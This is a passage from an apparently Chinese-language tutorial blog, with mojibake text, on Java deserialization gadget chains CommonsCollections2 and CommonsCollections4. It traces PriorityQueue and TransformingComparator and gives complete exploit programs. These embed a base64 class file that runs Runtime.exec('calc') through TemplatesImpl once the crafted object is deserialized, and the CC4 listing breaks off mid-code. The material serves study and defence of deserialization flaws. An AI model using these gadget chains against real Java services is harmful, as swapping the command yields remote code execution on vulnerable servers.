æ³•åºåˆ—åŒ–ã€‚</p><p>è¿™é‡Œéœ€è¦å¼•å…¥ä¸¤ä¸ªæ–°çš„ç±»ï¼Œé¦–å…ˆæ˜¯ PriorityQueue éƒ¨åˆ†å…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PriorityQueue</span>&lt;E&gt; <span class="keyword">extends</span> <span class="title class_">AbstractQueue</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Object[] queue;   <span class="comment">//å…³é”®ç‚¹ï¼Œå¯ä»¥ä¼ å…¥ TemplatesImpl</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Comparator&lt;? <span class="built_in">super</span> E&gt; comparator;     <span class="comment">//å…³é”®ç‚¹å¯ä»¥åå°„è®¾ç½®æˆ‘ä»¬è‡ªå·±çš„ Comparator</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//å…³é”®ç‚¹ï¼Œååºåˆ—åŒ–æ—¶å­—æ®µæ‰§è¡Œçš„ readObject</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//å…³é”®ç‚¹ï¼Œè°ƒç”¨ heapify() æ’åº</span></span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è·Ÿè¿› heapify() æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è·Ÿè¿› siftDown æ–¹æ³•ï¼Œå¦‚æœ comparator ä¸ä¸ºç©ºï¼Œè°ƒç”¨ siftDownUsingComparator</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è·Ÿè¿› siftDownUsingComparator æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨äº†æˆ‘ä»¬è‡ªå®šä¹‰çš„ Comparator</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">                comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)    <span class="comment">//å…³é”®ç‚¹</span></span><br><span class="line">                c = queue[child = right];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = c;</span><br><span class="line">            k = child;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å¯ä»¥çœ‹åˆ°å…¶ååºåˆ—åŒ–æ—¶è°ƒç”¨ readObject æ–¹æ³•ï¼Œç„¶åæœ€ç»ˆä¼šè°ƒç”¨ æˆ‘ä»¬è‡ªå®šä¹‰çš„ Comparator çš„ compare æ–¹æ³•</p><h4 id="è‡ªå®šä¹‰Comparator"><a href="#è‡ªå®šä¹‰Comparator" class="headerlink" title="è‡ªå®šä¹‰Comparator"></a>è‡ªå®šä¹‰Comparator</h4><p>å€ŸåŠ© TransformingComparator ç±»ï¼Œå¯ä»¥çœ‹åˆ°å…¶ Comparator æ–¹æ³•ä¸­ä¼šè°ƒç”¨ this.transformer.transform()ã€‚è¿™æ˜¯ä¸€ä¸ªå…³é”®ç‚¹ï¼Œæ¯•ç«Ÿæ‹¿åˆ° Transformer.transform() å°±ä»€ä¹ˆéƒ½å¥½è¯´ã€‚</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparator</span>&lt;I, O&gt; <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;I&gt;, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3456940356043606220L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Comparator&lt;O&gt; decorated;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> I, ? <span class="keyword">extends</span> <span class="title class_">O</span>&gt; transformer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">        <span class="comment">//å…³é”®ç‚¹</span></span><br><span class="line">        <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>CC2</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Apache_Common_Collections.cc_1_7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//å­—èŠ‚ç </span></span><br><span class="line">            <span class="type">byte</span>[] code = Base64.decode(<span class="string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">            setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">            setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//ä¸ºäº†æ‰§è¡Œ templates.newTransformer</span></span><br><span class="line">            <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//TransformingComparator å®ä¾‹</span></span><br><span class="line">            <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//PriorityQueue å®ä¾‹</span></span><br><span class="line">            <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">            <span class="comment">//å…ˆè®¾ç½®ä¸ºæ­£å¸¸å˜é‡å€¼ï¼Œåé¢å¯ä»¥é€šè¿‡setFieldValueä¿®æ”¹</span></span><br><span class="line">            priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">            priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">            Object[] objects = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;;</span><br><span class="line">            setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, objects);</span><br><span class="line">            setFieldValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, comparator);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(priorityQueue);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//æµ‹è¯•ååºåˆ—åŒ–</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è°ƒç”¨æ ˆ</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-&gt;PriorityQueue.readObject()</span><br><span class="line">      -&gt;PriorityQueue.heapify()</span><br><span class="line">          -&gt;PriorityQueue.siftDown()</span><br><span class="line">            -&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                -&gt;TransformingComparator.compare()</span><br><span class="line">                    -&gt;InvokerTransformer.transform()</span><br><span class="line">                        -&gt;TemplatesImpl.newTransformer()</span><br><span class="line">                        -&gt;â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure></div><h3 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h3><p><strong>æµ‹è¯•ç¯å¢ƒ</strong>ï¼š4.0ï¼Œjdk7u21åŠä»¥å‰</p><p>CC4 åªæ˜¯å°† CC2 ä¸­çš„ InvokerTransformer æ›¿æ¢ä¸ºäº† InstantiateTransformer</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Apache_Common_Collections.cc_1_7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸cc2ç±»ä¼¼</span></span><br><span class="line"><span class="comment">//InvokeTransformer å˜ä¸º InstantiateTransformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//å­—èŠ‚ç </span></span><br><span class="line">            <span class="type">byte</span>[] code = Base64.decode(<span class="string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 